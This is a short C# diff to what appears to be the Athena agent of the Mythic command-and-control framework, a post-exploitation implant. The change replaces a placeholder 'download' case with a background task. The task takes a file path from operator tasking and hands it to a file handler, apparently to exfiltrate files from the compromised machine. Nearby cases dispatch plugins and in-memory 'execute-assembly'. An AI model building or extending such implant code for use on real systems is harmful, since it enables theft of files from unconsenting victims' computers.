@@ -23,7 +23,15 @@ namespace Athena.Commands
                     checkAndRunPlugin(job);
                     break;
                 case "download":
-                    Console.WriteLine("Download");
+                    var downloadTask = Task.Run(() =>
+                    {
+                        MythicDownloadJob j = new MythicDownloadJob(job);
+                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                        j.path = par["file"];
+
+                        FileHandler.downloadFile(j);
+
+                    });
                     break;
                 case "execute-assembly":
                     if (Globals.executeAssemblyTask != "")
